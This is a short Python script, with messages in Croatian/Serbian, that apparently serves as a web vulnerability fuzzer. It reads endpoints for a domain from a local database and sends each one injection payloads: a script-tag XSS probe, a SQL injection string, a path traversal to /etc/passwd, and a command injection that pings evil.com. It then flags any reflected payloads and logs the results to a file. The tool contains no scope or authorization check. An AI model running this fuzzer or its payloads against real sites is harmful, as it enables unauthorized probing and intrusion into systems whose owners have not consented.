import sqlite3, requests, json, time
from urllib.parse import urljoin

def get_endpoints(domain):
    conn = sqlite3.connect("intel.db")
    c = conn.cursor()
    c.execute("SELECT endpoint FROM endpoints WHERE domain=?", (domain,))
    endpoints = [row[0] for row in c.fetchall()]
    conn.close()
    return endpoints

def fuzz_endpoint(base_url, endpoint, payloads):
    results = []
    full_url = urljoin(base_url, endpoint)
    for payload in payloads:
        try:
            url = f"{full_url}?q={payload}"
            r = requests.get(url, timeout=6)
            reflected = payload in r.text
            result = {
                "url": url,
                "status": r.status_code,
                "reflected": reflected,
                "length": len(r.text)
            }
            print(f"[{r.status_code}] {url} {'<-- REFLECTED' if reflected else ''}")
            results.append(result)
            time.sleep(0.4)
        except Exception as e:
            print(f"[!] ERROR: {e}")
    return results

def run_fuzzer(domain, base_url):
    endpoints = get_endpoints(domain)
    print(f"[*] Ukupno {len(endpoints)} endpointa za fuzzing...")
    payloads = [
        "<script>alert(1)</script>",
        "' OR 1=1--",
        "../../etc/passwd",
        "; ping -c 1 evil.com"
    ]

    all_results = []
    for idx, ep in enumerate(endpoints, 1):
        print(f"\n[{idx}/{len(endpoints)}] Fuzziram endpoint: {ep}")
        res = fuzz_endpoint(base_url, ep, payloads)
        all_results.extend(res)

    with open("fuzz_results.jsonl", "a") as f:
        for r in all_results:
            f.write(json.dumps(r) + "\n")

    print(f"\n[✓] Fuzzing završeno. Rezultati u: fuzz_results.jsonl")
